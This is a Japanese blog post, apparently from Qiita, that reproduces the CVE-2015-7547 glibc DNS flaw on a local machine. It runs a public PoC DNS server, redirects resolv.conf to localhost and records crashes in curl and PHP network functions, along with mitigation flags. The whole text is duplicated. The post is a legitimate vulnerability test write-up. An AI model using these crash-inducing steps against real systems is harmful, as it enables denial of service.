{"context": " More than 1 year has passed since last update.CVE-2015-7547 \u306e PoC \u304c\u516c\u958b\u3055\u308c\u3066\u3044\u305f\u306e\u3067\u8a66\u3057\u305f\u3002\n\nhttps://github.com/fjserna/CVE-2015-7547\n\nPoC \u306e\u30b3\u30fc\u30c9\u3092\u30c1\u30a7\u30c3\u30af\u30a2\u30a6\u30c8\u3057\u3066\u30b5\u30fc\u30d0\u5074\u3092\u5b9f\u884c\u3002\ngit clone https://github.com/fjserna/CVE-2015-7547.git\ncd CVE-2015-7547\nsudo ./CVE-2015-7547-poc.py\n\n\u30ea\u30be\u30eb\u30d0\u3092 127.0.0.1 \u306b\u5909\u66f4\u3002\nsudo cp /etc/resolv.conf{,.orig}\necho 'nameserver 127.0.0.1' | sudo tee /etc/resolv.conf\n\n\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u5074\u3092\u5b9f\u884c\u3002\ncd CVE-2015-7547\nmake\n./CVE-2015-7547-client\n\n\u30bb\u30b0\u308b\u3002\nSegmentation fault (core dumped)\n\ncurl \u3067\u3082\u540c\u3058\u3002\ncurl http://foo.bar.google.com\n# Segmentation fault (core dumped)\n\n-4 \u3068\u304b -6 \u3068\u304b\u3092\u4ed8\u3051\u3066 A \u3068 AAAA \u3068\u306e\u30c7\u30e5\u30a2\u30eb\u30af\u30a8\u30ea\u306b\u306a\u3089\u306a\u3044\u3088\u3046\u306b\u3059\u308c\u3070\u5927\u4e08\u592b\u3002\ncurl -4 --connect-timeout 10 http://foo.bar.google.com\n# curl: (28) Resolving timed out after 10558 millisecond\n\ncurl -6 --connect-timeout 10 http://foo.bar.google.com\n# curl: (28) Resolving timed out after 10534 milliseconds\n\ndig \u3059\u308b\u3068\u304a\u304b\u3057\u306a\u30d1\u30b1\u30c3\u30c8\u304c\u8fd4\u3063\u3066\u304d\u3066\u3044\u308b\u98a8\u306e\u7d50\u679c\u304c\u8868\u793a\u3055\u308c\u305f\u3002\ndig foo.bar.google.com @127.0.0.1\n# ;; Truncated, retrying in TCP mode.\n# ;; Got bad packet: bad label type\n# 2993 bytes\n# :\n\n\u3082\u3061\u308d\u3093 PHP \u306e curl \u3082\u30bb\u30b0\u308b\u3002\nphp -r '\n  $ch = curl_init(\"http://foo.bar.google.com\");\n  curl_exec($ch);\n'\n# Segmentation fault (core dumped)\n\nCURL_IPRESOLVE_V4 \u3068\u304b\u3092\u6307\u5b9a\u3057\u3066\u3044\u308c\u3070\u5927\u4e08\u592b\u3002\nphp -r '\n  $ch = curl_init(\"http://foo.bar.google.com\");\n  curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);\n  curl_setopt($ch, CURLOPT_TIMEOUT, 10);\n  curl_exec($ch);\n'\n\nhttp \u30b9\u30c8\u30ea\u30fc\u30e0\u30e9\u30c3\u30d1\u30fc\u306f\u30c0\u30e1\u3002\nphp -r '\n  file_get_contents(\"http://foo.bar.google.com\");\n'\n# Segmentation fault (core dumped)\n\nstream_socket_client \u3082\u30c0\u30e1\u3002\nphp -r 'stream_socket_client(\"tcp://foo.bar.google.com:80\");'\n# Segmentation fault (core dumped)\n\nfsockopen \u3082\u30c0\u30e1\u3002\nphp -r 'fsockopen(\"foo.bar.google.com\", 80);'\n# Segmentation fault (core dumped)\n\nsocket_connect \u306f AF_UNSPEC \u306b\u3059\u308b\u8853\u304c\u306a\u3044\u306e\u3067\u5927\u4e08\u592b\u3002\n\nhttps://github.com/php/php-src/blob/9360b0c6fc3416a9de1650c0b727e2f04fb913fb/ext/sockets/sockets.c#L1420\n\nCVE-2015-7547 \u306e PoC \u304c\u516c\u958b\u3055\u308c\u3066\u3044\u305f\u306e\u3067\u8a66\u3057\u305f\u3002\n\n- https://github.com/fjserna/CVE-2015-7547\n\nPoC \u306e\u30b3\u30fc\u30c9\u3092\u30c1\u30a7\u30c3\u30af\u30a2\u30a6\u30c8\u3057\u3066\u30b5\u30fc\u30d0\u5074\u3092\u5b9f\u884c\u3002\n\n```sh\ngit clone https://github.com/fjserna/CVE-2015-7547.git\ncd CVE-2015-7547\nsudo ./CVE-2015-7547-poc.py\n```\n\n\u30ea\u30be\u30eb\u30d0\u3092 127.0.0.1 \u306b\u5909\u66f4\u3002\n\n```sh\nsudo cp /etc/resolv.conf{,.orig}\necho 'nameserver 127.0.0.1' | sudo tee /etc/resolv.conf\n```\n\n\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u5074\u3092\u5b9f\u884c\u3002\n\n```sh\ncd CVE-2015-7547\nmake\n./CVE-2015-7547-client\n```\n\n\u30bb\u30b0\u308b\u3002\n\n```\nSegmentation fault (core dumped)\n```\n\ncurl \u3067\u3082\u540c\u3058\u3002\n\n```sh\ncurl http://foo.bar.google.com\n# Segmentation fault (core dumped)\n```\n\n`-4` \u3068\u304b `-6` \u3068\u304b\u3092\u4ed8\u3051\u3066 A \u3068 AAAA \u3068\u306e\u30c7\u30e5\u30a2\u30eb\u30af\u30a8\u30ea\u306b\u306a\u3089\u306a\u3044\u3088\u3046\u306b\u3059\u308c\u3070\u5927\u4e08\u592b\u3002\n\n```sh\ncurl -4 --connect-timeout 10 http://foo.bar.google.com\n# curl: (28) Resolving timed out after 10558 millisecond\n\ncurl -6 --connect-timeout 10 http://foo.bar.google.com\n# curl: (28) Resolving timed out after 10534 milliseconds\n```\n\ndig \u3059\u308b\u3068\u304a\u304b\u3057\u306a\u30d1\u30b1\u30c3\u30c8\u304c\u8fd4\u3063\u3066\u304d\u3066\u3044\u308b\u98a8\u306e\u7d50\u679c\u304c\u8868\u793a\u3055\u308c\u305f\u3002\n\n```sh\ndig foo.bar.google.com @127.0.0.1\n# ;; Truncated, retrying in TCP mode.\n# ;; Got bad packet: bad label type\n# 2993 bytes\n# :\n```\n\n\u3082\u3061\u308d\u3093 PHP \u306e curl \u3082\u30bb\u30b0\u308b\u3002\n\n```sh\nphp -r '\n  $ch = curl_init(\"http://foo.bar.google.com\");\n  curl_exec($ch);\n'\n# Segmentation fault (core dumped)\n```\n\n`CURL_IPRESOLVE_V4` \u3068\u304b\u3092\u6307\u5b9a\u3057\u3066\u3044\u308c\u3070\u5927\u4e08\u592b\u3002\n\n```sh\nphp -r '\n  $ch = curl_init(\"http://foo.bar.google.com\");\n  curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);\n  curl_setopt($ch, CURLOPT_TIMEOUT, 10);\n  curl_exec($ch);\n'\n```\n\nhttp \u30b9\u30c8\u30ea\u30fc\u30e0\u30e9\u30c3\u30d1\u30fc\u306f\u30c0\u30e1\u3002\n\n```sh\nphp -r '\n  file_get_contents(\"http://foo.bar.google.com\");\n'\n# Segmentation fault (core dumped)\n```\n\n`stream_socket_client` \u3082\u30c0\u30e1\u3002\n\n```sh\nphp -r 'stream_socket_client(\"tcp://foo.bar.google.com:80\");'\n# Segmentation fault (core dumped)\n```\n\n`fsockopen` \u3082\u30c0\u30e1\u3002\n\n```sh\nphp -r 'fsockopen(\"foo.bar.google.com\", 80);'\n# Segmentation fault (core dumped)\n```\n\n`socket_connect` \u306f `AF_UNSPEC` \u306b\u3059\u308b\u8853\u304c\u306a\u3044\u306e\u3067\u5927\u4e08\u592b\u3002\n\n- https://github.com/php/php-src/blob/9360b0c6fc3416a9de1650c0b727e2f04fb913fb/ext/sockets/sockets.c#L1420\n", "tags": ["Security", "dns"]}